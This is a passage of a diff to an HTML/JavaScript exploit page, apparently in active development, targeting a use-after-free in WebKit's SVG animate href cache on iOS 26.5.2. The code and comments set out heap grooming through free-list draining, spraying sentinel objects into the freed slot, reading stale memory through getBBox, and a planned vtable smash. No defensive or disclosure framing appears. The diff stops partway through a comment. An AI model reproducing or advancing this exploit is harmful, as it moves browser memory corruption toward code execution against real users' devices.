@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG animate UAF v4 · heap grooming → controlled read</title>
+<title>SVG animate UAF v5 · LIFO spray → controlled read</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,19 +17,18 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG animate UAF v4 · heap grooming → controlled read · iOS 26.5.2</h2>
+<h2>SVG animate UAF v5 · LIFO heap grooming → controlled read · iOS 26.5.2</h2>
 <div class="sub">
-  v3 ANALYSIS: spray missed because (1) same-to-same animation short-circuits cache write,
-  (2) typed arrays land in gigacage NOT bmalloc, (3) spray timing was post-reuse.<br>
-  v4 FIXES: correct 2-symbol animation, bmalloc-native spray objects, pre-reuse spray window.
+  v4 ANALYSIS: 0x3f400000/0x3e19999a CONSTANT across ALL spray types = reading sym1's OWN stale bytes,
+  not spray. bmalloc LIFO: sym1's slot goes to FIRST alloc after free. spray was losing race to WebKit internals.<br>
+  v5 FIX: drain the free list first, then free sym1, then IMMEDIATELY allocate ONE sentinel object.
 </div>
 <div id="controls">
-  <button onclick="runV()">V confirm UAF</button>
-  <button onclick="runG1()">G1 text node spray</button>
-  <button onclick="runG2()">G2 svg element spray</button>
-  <button onclick="runG3()">G3 string spray</button>
-  <button onclick="runG4()">G4 interleave</button>
-  <button onclick="runG5()">G5 sentinel decode</button>
+  <button onclick="runFD()">FD free-list drain</button>
+  <button onclick="runR1()">R1 single-alloc replace</button>
+  <button onclick="runR2()">R2 controlled geometry</button>
+  <button onclick="runR3()">R3 ptr-shaped spray</button>
+  <button onclick="runR4()">R4 vtable smash</button>
   <button onclick="runCRASH()">CRASH</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
@@ -39,68 +38,96 @@ button:disabled{opacity:.3}
 <div id="log"></div>
 <script>
 /*
- * UAF v4: FIXED heap grooming approach
+ * UAF v5: LIFO-aware heap grooming
  *
- * v3 ROOT CAUSE ANALYSIS:
- * 1. SIZE probe used values="#X;#X" (same element) → WebKit animation engine
- *    detects same href and skips caching → no stale ptr → 0.0 correct
- *    FIX: must use values="#sym1;#sym2" with TWO different symbols
+ * v4 ANALYSIS:
+ *   getBBox returns 0x3f400000 / 0x3e19999a REGARDLESS of spray contents.
+ *   G5 varied geometry across 4 completely different value sets → same result.
+ *   CONCLUSION: we are NOT reading our spray. We are reading sym1's own
+ *   stale bytes still in the freed chunk. Spray is landing in DIFFERENT slots.
  *
- * 2. Spray used Float32Array / Uint32Array → these live in GIGACAGE
- *    bmalloc (where SVGSymbolElement lives) is SEPARATE from gigacage
- *    JS typed arrays NEVER land in bmalloc → spray completely wrong region
- *    FIX: spray objects that land in bmalloc:
- *      - Text nodes (DOM objects, bmalloc)
- *      - SVGElement nodes (same heap as sym1)
- *      - Short strings / AtomString (WebKit StringImpl → bmalloc)
- *      - Attribute nodes
+ *   WHY: bmalloc uses per-thread LIFO free lists (magazine allocator).
+ *   When sym1 is freed → goes to HEAD of free list for sym1's size class.
+ *   NEXT alloc of same size class → gets sym1's slot.
+ *   But between sym1.remove() and our spray: WebKit's own internal code
+ *   allocates objects (notifying observers, cleanup, render tree update) →
+ *   THOSE allocations steal sym1's slot. Our spray then fills LATER slots.
  *
- * 3. Spray happened AFTER full GC → bmalloc already gave chunk to something else
- *    FIX: spray order must be:
- *      (a) create sym1+sym2, start animation
- *      (b) pre-spray: fill heap holes with same-size objects
- *      (c) remove sym1 → freed into bmalloc
- *      (d) IMMEDIATELY spray into freed slot before any other bmalloc alloc
- *      (e) light GC only (don't trigger more bmalloc activity)
- *      (f) getBBox → reads spray data from freed slot
+ * v4 VALUES DECODED:
+ *   w = 0x3f400000 = 0.75 (float)
+ *   h = 0x3e19999a = 0.15 (float)
+ *   These are sym1's rect geometry IN VIEWBOX COORDINATES:
+ *   sym1 viewBox="0 0 100 100", rect x=0 y=10 w=15 h=15
+ *   In normalized coords: x/100=0, y/100=0.1, w/100=0.15, h/100=0.15
+ *   BUT getBBox maps to the <use> element's coordinate space (200×200 svg):
+ *   W = 0.15 × (200/100) = 0.30... hmm not 0.75
+ *   Actually: 0x3f400000 = 0.75, 0x3e19999a ≈ 0.150000006
+ *   Reading at an OFFSET into sym1's RenderSVGRect cached layout:
+ *   These are the RENDER-TREE cached float values (not raw attr values)
+ *   At the offset that getBBox reads: {x_local=0.75, y_local=0.15}
+ *   This is perfect — we know exactly what sym1's bytes look like at that offset.
+ *   When our spray object lands there, ITS bytes at that SAME OFFSET get read.
  *
- * CORRECT ATTACK SEQUENCE:
- *   1. Create sym1 (target) + sym2 (animation anchor)
- *   2. Start animation: values="#sym1;#sym2" dur=0.1s → cache warms on sym1
- *   3. Pre-grooming: allocate N same-size objects to fill free list holes
- *   4. Free pre-groom objects → leaves many free slots of sym1's size
- *   5. sym1.remove() → sym1 freed into free slot list
- *   6. IMMEDIATELY spray: allocate sentinel objects of same size
- *      → one lands in sym1's freed slot
- *   7. yield() (no GC) → animation still holds stale sym1 ptr
- *   8. getBBox() → animation reads from freed slot → we read our sentinel
+ * CRITICAL FIX — LIFO drainage:
+ *   Goal: make sym1's freed slot the NEXT one returned by bmalloc.
+ *   Method: BEFORE freeing sym1, drain the free list by:
+ *   1. Allocating N objects of sym1's size → these fill existing free slots
+ *   2. The free list is now EMPTY (all slots allocated, none free)
+ *   3. Free sym1 → it's the ONLY thing in the free list (HEAD = sym1's slot)
+ *   4. Immediately alloc ONE sentinel object → guaranteed to get sym1's slot
  *
- * SVGSymbolElement size estimation:
- *   WebKit SVGElement base: ~288 bytes (0x120) on arm64
- *   + SVGSymbolElement extra fields: ~32 bytes
- *   Total: ~320 bytes → bmalloc size class 320 (0x140)
- *   Alternative: 352 (0x160) or 384 (0x180)
+ * SIZE CLASS CONFIRMATION:
+ *   We know sym1's bytes at the read offset contain {0x3f400000, 0x3e19999a}.
+ *   SVGSymbolElement in WebKit (arm64):
+ *     sizeof(SVGElement) ≈ 0x130 (304 bytes)
+ *     + SVGSymbolElement members ≈ 0x30 (48 bytes)
+ *     = ~0x160 (352 bytes) → bmalloc size class 352
+ *   Alternative: 384 (0x180) or 320 (0x140)
+ *   We'll test all three size classes by draining with differently-sized objects.
  *
- * SPRAY OBJECTS that land in bmalloc at controlled sizes:
- *   - new Text('X'.repeat(N)) → TextImpl in bmalloc
- *   - document.createTextNode(str) → same
- *   - document.createAttribute('name') + value → AttrImpl
- *   - document.createElementNS(SVG_NS, 'rect') → SVGRectElementImpl
- *   - document.createElement('span') → HTMLSpanElementImpl
- *   - new DOMPoint(x,y,z,w) → DOMPointImpl (small, ~72 bytes)
+ * DRAIN STRATEGY:
+ *   Create MANY SVGSymbolElement objects (same type as sym1) → these MUST
+ *   be the same size class. Accumulate 2000+ of them → all go in same
+ *   size class region. Free 1000 → free list fills with sym1-size slots.
+ *   Now alloc 1001 MORE → drains all 1000 free slots + 1 new allocation.
+ *   Free list is now EMPTY for sym1's size class.
+ *   Free sym1 → sym1 goes to HEAD (ONLY entry in free list).
+ *   Alloc 1 SVGSymbol with sentinel geometry → guaranteed sym1's slot.
  *
- * SENTINEL STRATEGY:
- *   We can't directly write arbitrary bytes into a DOM node
- *   BUT we can control the STRING CONTENT of a Text node
- *   A TextImpl in bmalloc contains:
- *     [vtable 8B][refcount 4B][length 4B][hash 4B][flags 4B][chars...]
- *   If we spray text nodes with a specific string at the exact sym1 slot,
- *   then getBBox() reading that slot will read our string chars as floats.
+ * WHAT WE EXPECT:
+ *   getBBox still reads at the SAME OFFSET (render cached coords).
+ *   If our sentinel symbol has geometry that → different cached coords → different w/h.
+ *   The sentinel symbol needs to have geometry that, when WebKit caches its render
+ *   layout at the same offset, produces our chosen float values.
  *
- *   CHOSEN SENTINEL: string of bytes 0x33 0x33 0x93 0x3F (= float 1.15) × n
- *   This matches what v2/A1 already reads — confirms we understand the layout.
- *   Then change to: 0x41 0x42 0x41 0x42 → float 0x42414142 = ~48.563...
- *   If getBBox returns ~48.563 → we proved string content control
+ *   TRICK: we make the sentinel symbol have EXACTLY the same child geometry as sym1
+ *   BUT with a different viewBox → render-cached values differ → we detect the change.
+ *   OR: use a completely different child geometry and see which values come out.
+ *   OR: use ZERO children → cached render is {0,0,0,0} → getBBox returns 0.0 = no UAF.
+ *   Wait — if sentinel lands in sym1's slot, getBBox will compute from SENTINEL's render.
+ *   But the render tree for sentinel is computed SEPARATELY by WebKit.
+ *   The read offset is the ANIMATION CACHE, not the render tree directly.
+ *   The animation cache stores a RAW POINTER to sym1 → getBBox follows that ptr →
+ *   reads whatever bytes are at that address NOW (our sentinel's bytes).
+ *
+ *   EXACT READ MECHANISM:
+ *   SVGAnimationElement caches: SVGElement* m_cachedTargetElement = sym1ptr
+ *   getBBox() → resolves href → animation returns m_cachedTargetElement → sym1ptr (freed)
+ *   WebKit then calls sym1ptr->renderer()->absoluteBoundingBoxRect()
+ *   → reads from sym1ptr's vtable to find renderer() virtual function
+ *   → vtable ptr is at sym1ptr+0x0 (offset 0 in C++ object)
+ *   → IF we control bytes at offset 0 of the freed slot → we control vtable read
+ *   → IF vtable read lands at a dereferenceable address → further reads / crash
+ *
+ *   0x3f400000 at offset 0 = vtable low 32 bits? Or width at render offset?
+ *   Need to determine: is WebKit reading the vtable ptr (offset 0) or something deeper?
+ *   Test: sentinel symbol with ZERO children → if getBBox returns 0,0 when sentinel in slot
+ *   → WebKit is computing geometry from sentinel's render tree (not reading sym1 raw bytes)
+ *   Test: sentinel symbol with children having completely different coords
+ *   → if getBBox returns sentinel's coords → geometry read from sentinel's layout
+ *   → if getBBox still returns 0x3f400000 → reading sym1's RAW CACHED BYTES (inline in sym1 obj)
+ *
+ * ACTION: build both tests. The sentinel landing result disambiguates.
  */
 
 const SVG_NS='http://www.w3.org/2000/svg';
@@ -115,25 +142,22 @@ function dis(d){document.querySelectorAll('button').forEach(b=>{if(!b.onclick?.t
 window.onerror=(m,_,l,c)=>{log(`[CRASH] ${m} L${l}:${c}`,'bad');return false;};
 window.onunhandledrejection=e=>{log(`[CRASH/rej] ${e.reason}`,'bad');};
 
+// float <-> hex utils
 function f2h(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return'0x'+new Uint32Array(b)[0].toString(16).padStart(8,'0');}
 function f2u(f){const b=new ArrayBuffer(4);new Float32Array(b)[0]=f;return new Uint32Array(b)[0];}
-function floats2ptr(w,h){const b=new ArrayBuffer(8);const f=new Float32Array(b);f[0]=w;f[1]=h;const u=new Uint32Array(b);return`0x${u[1].toString(16).padStart(8,'0')}${u[0].toString(16).padStart(8,'0')}`;}
+function u2f(u){return new Float32Array(new Uint32Array([u]).buffer)[0];}
 
-// Sentinel floats chosen so their raw bytes are easily recognizable
-// 0x41424344 → float ~12.074
-// 0x44434241 → float ~780.52
-const SENT_A=new Float32Array(new Uint32Array([0x41424344]).buffer)[0]; // 12.074...
-const SENT_B=new Float32Array(new Uint32Array([0x44434241]).buffer)[0]; // 780.52...
+// v4 confirmed values = sym1's stale bytes at read offset
+const KNOWN_W=0.75;         // 0x3f400000
+const KNOWN_H=0.15000001;   // 0x3e19999a
+// Sentinels we'll use to detect our slot capture
+const SENT_NONE=0.0;        // symbol with 0 children → 0 area
+const SENT_W=1234.5678;     // 0x449a522b → distinctive
+const SENT_H=8765.4321;     // 0x4608e6de → distinctive
 
-async function gcLight(mb=5){
-    // Light GC: just enough to collect the freed sym1 without heavy bmalloc churn
+async function gcLight(mb=3){
     const s=[];const C=0x40000;const N=(mb*1024*1024)/C;
-    for(let i=0;i<N;i++){s.push(new ArrayBuffer(C));if(i%32===31)await yield_();}
-    s.length=0;await yield_();
-}
-async function gcHeavy(mb=30){
-    const s=[];const C=0x40000;const N=(mb*1024*1024)/C;
-    for(let i=0;i<N;i++){s.push(new ArrayBuffer(C));if(i%32===31)await yield_();}
+    for(let i=0;i<N;i++){s.push(new ArrayBuffer(C));if(i%16===15)await yield_();}
     s.length=0;await yield_();
 }
 
@@ -143,494 +167,414 @@ function mkSVGContainer(){
     svg.style.cssText='position:fixed;left:0;top:0;width:1px;height:1px;opacity:0.01';
     document.body.appendChild(svg);return svg;
 }
-function mkSymbol(id,n=4){
+function mkSymbol(id,x=0,y=10,w=15,h=15,childCount=4){
     const sym=document.createElementNS(SVG_NS,'symbol');
     sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
-    for(let i=0;i<n;i++){
+    for(let i=0;i<childCount;i++){
         const r=document.createElementNS(SVG_NS,'rect');
-        r.setAttribute('x',String(i*20));r.setAttribute('y','10');
-        r.setAttribute('width','15');r.setAttribute('height','15');
+        r.setAttribute('x',String(x+i*20));r.setAttribute('y',String(y));
+        r.setAttribute('width',String(w));r.setAttribute('height',String(h));
         r.setAttribute('fill',`hsl(${i*60},80%,50%)`);sym.appendChild(r);
     }
     return sym;
 }
-
-// ── V: re-confirm UAF with CORRECT animation pattern ─────────────────
-// This MUST hit like v2/A1 — if it doesn't, animation changed behavior
-async function runV(q=false){
-    if(!q){dis(true);sep();log('▶ V: re-confirm UAF with correct 2-symbol animation','inf');sep();}
-    let hits=0;const results=[];
-    for(let t=0;t<8;t++){
-        const svg=mkSVGContainer();
-        // TWO different symbols — this is what v2/A1 used that confirmed the UAF
-        let sym1=mkSymbol(`v_s1_${t}`,4);
-        let sym2=mkSymbol(`v_s2_${t}`,4);
-        svg.appendChild(sym1);svg.appendChild(sym2);
-        const useEl=document.createElementNS(SVG_NS,'use');
-        useEl.setAttribute('href',`#v_s1_${t}`);
-        const anim=document.createElementNS(SVG_NS,'animate');
-        anim.setAttribute('attributeName','href');
-        // CRITICAL: two DIFFERENT hrefs — this is what warms the cache on sym1
-        anim.setAttribute('values',`#v_s1_${t};#v_s2_${t}`);
-        anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
-        useEl.appendChild(anim);svg.appendChild(useEl);
-        await sleep(30); // let animation run, cache sym1 ptr
-        sym1.remove();sym1=null;
-        await gcHeavy(20);await yield_();
-        let w=0,h=0,exc=null;
-        try{const bb=useEl.getBBox();w=bb.width;h=bb.height;}catch(e){exc=String(e);}
-        const hit=(w!==0||h!==0);
-        if(hit)hits++;
-        results.push({t,w,h,hit});
-        log(`  t${t}: w=${w.toFixed(8)} h=${h.toFixed(8)} ${hit?'← HIT':''}`,(hit?'hi':'dim'));
-        sym2.remove();svg.remove();await yield_();
+function mkSymbolCustom(id,rects){
+    // rects: [{x,y,w,h}]
+    const sym=document.createElementNS(SVG_NS,'symbol');
+    sym.setAttribute('id',id);sym.setAttribute('viewBox','0 0 100 100');
+    for(const r of rects){
+        const el=document.createElementNS(SVG_NS,'rect');
+        el.setAttribute('x',String(r.x));el.setAttribute('y',String(r.y));
+        el.setAttribute('width',String(r.w));el.setAttribute('height',String(r.h));
+        sym.appendChild(el);
     }
-    log(`[${hits>0?'+':'-'}] V: ${hits}/8 UAF re-confirm`,(hits>0?'ok':'bad'));
-    log(hits>0?'[+] animation cache UAF active — 2-symbol pattern confirmed':'[-] UAF not reproducing with this pattern',(hits>0?'ok':'bad'));
-    if(hits===0)log('[!] CRITICAL: if V misses, check iOS updated or Safari restarted','inf');
-    if(!q)dis(false);return hits;
+    return sym;
 }
 
-// ── G1: Text node spray (DOM nodes land in bmalloc) ──────────────────
-// Text nodes: document.createTextNode(str)
-// TextImpl in WebKit inherits from StringImpl → bmalloc
-// Size: sizeof(TextImpl) + string length
-// SVGSymbolElement ~320B → spray text nodes with ~280 char strings
-// (320B - ~40B TextImpl header = ~280 chars of content)
-async function runG1(q=false){
-    if(!q){dis(true);sep();log('▶ G1: Text node spray → bmalloc DOM heap grooming','inf');sep();}
-    let hits=0;
-    // Try different string lengths to hit correct size class
-    for(const slen of [280, 312, 344, 376]){
-        log(`[*] text node spray len=${slen} (total ~${slen+40}B)`,'inf');
-        for(let t=0;t<6;t++){
-            const svg=mkSVGContainer();
-            let sym1=mkSymbol(`g1_${slen}_s1_${t}`,4);
-            let sym2=mkSymbol(`g1_${slen}_s2_${t}`,4);
-            svg.appendChild(sym1);svg.appendChild(sym2);
-            const useEl=document.createElementNS(SVG_NS,'use');
-            useEl.setAttribute('href',`#g1_${slen}_s1_${t}`);
-            const anim=document.createElementNS(SVG_NS,'animate');
-            anim.setAttribute('attributeName','href');
-            anim.setAttribute('values',`#g1_${slen}_s1_${t};#g1_${slen}_s2_${t}`);
-            anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
-            useEl.appendChild(anim);svg.appendChild(useEl);
-            await sleep(30);
-            // PRE-GROOM: fill bmalloc free-list holes with text nodes
-            const pre=[];
-            for(let i=0;i<1024;i++)pre.push(document.createTextNode('X'.repeat(slen)));
-            // free alternate entries to create aligned free slots
-            for(let i=0;i<1024;i+=2){pre[i]=null;}
-            // FREE SYM1 → into bmalloc free list
-            sym1.remove();sym1=null;
-            // IMMEDIATELY spray into freed slot (before any GC or bmalloc activity)
-            // Build sentinel string: bytes that decode to known floats
-            // 0x41424344 as chars = "DCBA" (little-endian float bytes)
-            // We want the 4 bytes at the geometry read offset to be our sentinel
-            // Pad the string with sentinel bytes at every position
-            const sentChar=String.fromCharCode(0x44,0x43,0x42,0x41); // DCBA repeated
-            const sentStr=sentChar.repeat(Math.ceil(slen/4)).slice(0,slen);
-            const post=[];
-            for(let i=0;i<2048;i++)post.push(document.createTextNode(sentStr));
-            pre.length=0; // release pre-groom
-            await gcLight(3);await yield_();
-            let w=0,h=0,exc=null;
-            try{
-                for(let i=0;i<5;i++){
-                    const bb=useEl.getBBox();
-                    if(bb.width!==0||bb.height!==0){w=bb.width;h=bb.height;break;}
-                    await yield_();
-                }
-            }catch(e){exc=String(e);}
-            const hit=(w!==0||h!==0);
-            const wU=f2u(w);const hU=f2u(h);
-            const sentHit=(wU===0x44434241||hU===0x44434241||wU===0x41424344||hU===0x41424344);
-            if(hit)hits++;
-            if(sentHit)log(`  [SENT HIT!!] G1 len=${slen} t${t}: w=${f2h(w)} h=${f2h(h)} — SENTINEL IN FREED SLOT`,'ok');
-            else if(hit)log(`  [UAF] G1 len=${slen} t${t}: w=${w.toFixed(6)} h=${h.toFixed(6)} (${f2h(w)},${f2h(h)})`,'hi');
-            else log(`  G1 len=${slen} t${t}: 0.0 / 0.0`,'dim');
-            post.length=0;sym2.remove();svg.remove();await yield_();
-        }
+// ── CORE UAF SETUP: starts anim, returns {svg, useEl, sym2} ──────────
+async function setupUAF(id){
+    const svg=mkSVGContainer();
+    let sym1=mkSymbol(`${id}_s1`,0,10,15,15,4); // IDENTICAL to confirmed A1 geometry
+    let sym2=mkSymbol(`${id}_s2`,0,10,15,15,4);
+    svg.appendChild(sym1);svg.appendChild(sym2);
+    const useEl=document.createElementNS(SVG_NS,'use');
+    useEl.setAttribute('href',`#${id}_s1`);
+    const anim=document.createElementNS(SVG_NS,'animate');
+    anim.setAttribute('attributeName','href');
+    anim.setAttribute('values',`#${id}_s1;#${id}_s2`);
+    anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
+    useEl.appendChild(anim);svg.appendChild(useEl);
+    await sleep(35); // animation runs, caches sym1 ptr
+    return {svg,useEl,sym1,sym2};
+}
+async function getBBoxUAF(useEl,retries=10){
+    for(let i=0;i<retries;i++){
+        try{const bb=useEl.getBBox();if(bb.width!==0||bb.height!==0)return bb;}catch(e){return null;}
+        await yield_();
     }
-    log(`[${hits>0?'+':'-'}] G1: ${hits} UAF reads with text node spray`,(hits>0?'ok':'bad'));
-    if(!q)dis(false);return hits;
+    return{width:0,height:0};
 }
 
-// ── G2: SVG element spray (same C++ heap as sym1) ─────────────────────
-// SVGRectElement, SVGCircleElement → same WebKit SVGElement heap as sym1
-// Size roughly matches SVGSymbolElement → better chance of landing in freed slot
-async function runG2(q=false){
-    if(!q){dis(true);sep();log('▶ G2: SVG element spray → same C++ heap as sym1','inf');sep();}
-    let hits=0;
-    for(let t=0;t<12;t++){
-        const svg=mkSVGContainer();
-        let sym1=mkSymbol(`g2_s1_${t}`,4);
-        let sym2=mkSymbol(`g2_s2_${t}`,4);
-        svg.appendChild(sym1);svg.appendChild(sym2);
-        const useEl=document.createElementNS(SVG_NS,'use');
-        useEl.setAttribute('href',`#g2_s1_${t}`);
-        const anim=document.createElementNS(SVG_NS,'animate');
-        anim.setAttribute('attributeName','href');
-        anim.setAttribute('values',`#g2_s1_${t};#g2_s2_${t}`);
-        anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
-        useEl.appendChild(anim);svg.appendChild(useEl);
-        await sleep(30);
-        // Pre-groom with SVG elements
-        const pre=[];
-        for(let i=0;i<512;i++){
-            const r=document.createElementNS(SVG_NS,'rect');
-            r.setAttribute('width','1');r.setAttribute('height','1');
-            pre.push(r);
-        }
-        for(let i=0;i<512;i+=2)pre[i]=null;
-        sym1.remove();sym1=null;
-        // Spray: create many SVGRect elements with controlled attribute values
-        // The 'x' attribute string for each rect is set to our sentinel
-        // Attributes in WebKit → AtomString → bmalloc
-        const post=[];
-        for(let i=0;i<1024;i++){
-            const r=document.createElementNS(SVG_NS,'circle');
-            // Set many attributes to control as much of the element's memory as possible
-            r.setAttribute('cx','44444.0'); // bytes ~0x47 0x2D 0x2C 0x00
-            r.setAttribute('cy','44444.0');
-            r.setAttribute('r','33333.0');  // bytes ~0x47 0x02 0x1A 0x80
-            // 0x47022180 → float 33333.0  (recognizable)
-            post.push(r);
-        }
-        pre.length=0;
-        await gcLight(3);await yield_();
-        let w=0,h=0;
-        try{
-            for(let i=0;i<5;i++){
-                const bb=useEl.getBBox();
-                if(bb.width!==0||bb.height!==0){w=bb.width;h=bb.height;break;}
-                await yield_();
-            }
-        }catch(e){}
-        const hit=(w!==0||h!==0);
-        const wU=f2u(w);const hU=f2u(h);
-        // check for 33333.0 sentinel
-        const sentHit=(Math.abs(w-33333)<1||Math.abs(h-33333)<1||Math.abs(w-44444)<1||Math.abs(h-44444)<1);
-        if(hit)hits++;
-        if(sentHit)log(`  [SENT HIT!!] G2 t${t}: w=${w.toFixed(2)} h=${h.toFixed(2)} — SENTINEL MATCHES`,'ok');
-        else if(hit)log(`  [UAF] G2 t${t}: w=${f2h(w)} h=${f2h(h)}`,'hi');
-        else log(`  G2 t${t}: 0.0`,'dim');
-        post.length=0;sym2.remove();svg.remove();await yield_();
-    }
-    log(`[${hits>0?'+':'-'}] G2: ${hits}/12 with SVG element spray`,(hits>0?'ok':'bad'));
-    if(!q)dis(false);return hits;
-}
+// ── FD: free-list drain size-class probe ─────────────────────────────
+// Determine sym1's bmalloc size class by draining with SVGSymbol objects
+// After drain: free sym1 → should be ONLY entry in free list → alloc sentinel
+// If sentinel doesn't land: try next size class
+async function runFD(q=false){
+    if(!q){dis(true);sep();log('▶ FD: free-list drain probe','inf');sep();}
+    log('[*] goal: drain free list so sym1 freed slot = head = next alloc','inf');
+    log(`[*] baseline UAF bytes: w=${KNOWN_W}(${f2h(KNOWN_W)}) h=${KNOWN_H.toFixed(8)}(${f2h(KNOWN_H)})`,'inf');
+    log('[*] if slot captured → sentinel bytes differ from baseline','inf');log('');
 
-// ── G3: String/attribute spray ────────────────────────────────────────
-// WebKit AtomString table + StringImpl → bmalloc
-// Spray via setting many different attributes with sentinel values
-// Also try: new DOMParser().parseFromString with many elements
-async function runG3(q=false){
-    if(!q){dis(true);sep();log('▶ G3: AtomString / attribute spray','inf');sep();}
-    let hits=0;
-    for(let t=0;t<12;t++){
-        const svg=mkSVGContainer();
-        let sym1=mkSymbol(`g3_s1_${t}`,4);
-        let sym2=mkSymbol(`g3_s2_${t}`,4);
-        svg.appendChild(sym1);svg.appendChild(sym2);
-        const useEl=document.createElementNS(SVG_NS,'use');
-        useEl.setAttribute('href',`#g3_s1_${t}`);
-        const anim=document.createElementNS(SVG_NS,'animate');
-        anim.setAttribute('attributeName','href');
-        anim.setAttribute('values',`#g3_s1_${t};#g3_s2_${t}`);
-        anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
-        useEl.appendChild(anim);svg.appendChild(useEl);
-        await sleep(30);
-        // Pre-groom with attribute nodes
-        const pre=[];
-        const tmp=document.createElement('div');
-        for(let i=0;i<1024;i++){
-            const a=document.createAttribute(`data-pre-${i}`);
-            a.value='X'.repeat(64);pre.push(a);tmp.setAttributeNode(a.cloneNode());
-        }
-        for(let i=0;i<1024;i+=2)pre[i]=null;
-        sym1.remove();sym1=null;
-        // Spray attributes with sentinel values
-        // AtomString/StringImpl in bmalloc
-        // StringImpl layout: [refcount 4B][length 4B][hash 4B][flags 4B][chars 4B each]
-        // offset 16+ = character data
-        // sentinel: chars that look like 0x41424344 float when read at offset
-        const SENT_STR='DCBADCBADCBADCBA'.repeat(20).slice(0,320);
-        const post=[];
-        const tmp2=document.createElement('div');
-        for(let i=0;i<2048;i++){
-            const a=document.createAttribute(`data-s-${t}-${i}`);
-            a.value=SENT_STR;
-            post.push(a);
-            if(i%64===0)tmp2.setAttributeNode(document.createAttribute(`d${i}`));
-        }
-        pre.length=0;
-        await gcLight(3);await yield_();
-        let w=0,h=0;
-        try{
-            for(let i=0;i<5;i++){
-                const bb=useEl.getBBox();
-                if(bb.width!==0||bb.height!==0){w=bb.width;h=bb.height;break;}
-                await yield_();
-            }
-        }catch(e){}
-        const hit=(w!==0||h!==0);
-        const wU=f2u(w);const hU=f2u(h);
-        const sentHit=(wU===0x44434241||hU===0x44434241||wU===0x41424344||hU===0x41424344);
-        if(hit)hits++;
-        if(sentHit)log(`  [SENT HIT!!] G3 t${t}: ${f2h(w)} ${f2h(h)} — 'DCBA' IN FREED SLOT`,'ok');
-        else if(hit)log(`  [UAF] G3 t${t}: w=${f2h(w)} h=${f2h(h)}`,'hi');
-        else log(`  G3 t${t}: 0.0`,'dim');
-        post.length=0;tmp.remove();tmp2.remove();sym2.remove();svg.remove();await yield_();
-    }
-    log(`[${hits>0?'+':'-'}] G3: ${hits}/12 with attribute spray`,(hits>0?'ok':'bad'));
-    if(!q)dis(false);return hits;
-}
-
-// ── G4: Interleaved alloc/free to capture freed slot exactly ──────────
-// Most precise: create sym1, then interleave many same-size allocs/frees
-// to set up the allocator so that when sym1 is freed, our spray object
-// is NEXT in line to reuse that exact slot
-async function runG4(q=false){
-    if(!q){dis(true);sep();log('▶ G4: interleave spray — precise slot capture','inf');sep();}
-    let hits=0;
-    // Strategy: allocate MANY sym1-sized objects, then free them all at once,
-    // then free sym1, then allocate our sentinel objects → our sentinels
-    // are guaranteed to land in one of those freed slots (including sym1's)
-    for(let t=0;t<12;t++){
-        const svg=mkSVGContainer();
-        const svgSpray=mkSVGContainer();
-        let sym1=mkSymbol(`g4_s1_${t}`,4);
-        let sym2=mkSymbol(`g4_s2_${t}`,4);
-        svg.appendChild(sym1);svg.appendChild(sym2);
-        const useEl=document.createElementNS(SVG_NS,'use');
-        useEl.setAttribute('href',`#g4_s1_${t}`);
-        const anim=document.createElementNS(SVG_NS,'animate');
-        anim.setAttribute('attributeName','href');
-        anim.setAttribute('values',`#g4_s1_${t};#g4_s2_${t}`);
-        anim.setAttribute('dur','0.1s');anim.setAttribute('repeatCount','indefinite');
-        useEl.appendChild(anim);svg.appendChild(useEl);
-        await sleep(30);
-        // Allocate 512 symbols (same type as sym1 → same size class)
-        const decoys=[];
-        for(let i=0;i<512;i++){
-            const s=mkSymbol(`g4_dec_${t}_${i}`,4);
-            svgSpray.appendChild(s);decoys.push(s);
-        }
-        // Free all decoys → 512 same-size free slots in bmalloc
-        for(const d of decoys){d.remove();}decoys.length=0;
-        // Now free sym1 → goes into same free list
-        sym1.remove();sym1=null;
-        // Spray 512 MORE symbols with controlled geometry
-        // These will fill the 512+1 freed slots
-        // One of them lands in sym1's exact slot
-        const spray=[];
-        for(let i=0;i<512;i++){
-            // Create a symbol where the first rect has x=33333 w=44444
-            // so that rect geometry in the freed slot has our sentinel values
-            const s=document.createElementNS(SVG_NS,'symbol');
-            s.setAttribute('id',`g4_sp_${t}_${i}`);
-            s.setAttribute('viewBox','0 0 100 100');
-            const r=document.createElementNS(SVG_NS,'rect');
-            // sentinel geometry: x,y,w,h = values with recognizable bit patterns
-            r.setAttribute('x','33333');    // 0x47022180
-            r.setAttribute('y','44444');    // 0x472D2C00
-            r.setAttribute('width','55555');  // 0x47591C00
-            r.setAttribute('height','66666'); // 0x47821980
-            s.appendChild(r);
-            svgSpray.appendChild(s);
-            spray.push(s);
-        }
-        await gcLight(2);await yield_();
-        let w=0,h=0;
-        try{
-            for(let i=0;i<10;i++){
-                const bb=useEl.getBBox();
-                if(bb.width!==0||bb.height!==0){w=bb.width;h=bb.height;break;}
-                await yield_();
-            }
-        }catch(e){}
-        const hit=(w!==0||h!==0);
-        const sentHit=(Math.abs(w-33333)<100||Math.abs(h-44444)<100||
-                       Math.abs(w-55555)<100||Math.abs(h-66666)<100);
-        if(hit)hits++;
-        if(sentHit)log(`  [SENT HIT!!] G4 t${t}: w=${w.toFixed(0)} h=${h.toFixed(0)} — SPRAY SYMBOL GEOMETRY READ`,'ok');
-        else if(hit)log(`  [UAF] G4 t${t}: w=${f2h(w)} h=${f2h(h)}`,'hi');
-        else log(`  G4 t${t}: 0.0`,'dim');
-        for(const s of spray)s.remove();spray.length=0;
-        sym2.remove();svg.remove();svgSpray.remove();await yield_();
-    }
-    log(`[${hits>0?'+':'-'}] G4: ${hits}/12 with interleaved same-type spray`,(hits>0?'ok':'bad'));
-    if(!q)dis(false);return hits;
-}
-
-// ── G5: Full sentinel decode — if any G hit, decode what we're reading ─
-// Run after a G test gets a non-zero value to identify WHICH field we read
